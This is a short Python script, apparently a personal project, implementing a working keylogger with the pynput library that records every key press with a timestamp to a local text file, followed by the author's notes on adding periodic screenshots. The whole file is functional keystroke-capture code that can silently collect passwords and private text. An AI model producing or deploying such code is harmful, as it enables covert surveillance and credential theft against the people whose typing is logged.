
import time
from pynput import keyboard
from pynput.keyboard import Listener
from datetime import datetime


class Keylogger:

    def __init__(self):
        self.log = "Keylogger started ..."

    
    def saveLogToFile(self, log):
        with open("keylog.txt", "a") as file:
            file.write(log)

    def saveData(self, key):
        try:
            currentKey = str(key.char) 
        except AttributeError:
            if key == key.space:
                currentKey = "SPACE" 
            elif key == key.esc:
                currentKey = "ESC" 
            else:
                currentKey = " " + str(key) + " "

        currentTime = datetime.now().strftime(" %Y-%m-%d %H:%M:%S ")
        log = currentKey + currentTime + "\n"
        self.saveLogToFile(log)

    def run(self):

        keyboardListener = keyboard.Listener(on_press=self.saveData)

        with keyboardListener:
            keyboardListener.join()




if __name__ == "__main__":
    logger = Keylogger()
    logger.run()




































"""
 points to be considered

 --> first take screenshot for every 10 seconds or like every mouse interaction
 --> then add that screenshot to a pdf
 --> along with key logs 
 --> first of all we will only run this script for about 10 minutes and
        then terminate it !

--> the idea is bit changed now , we will only now adding logs to .txt __file
"""
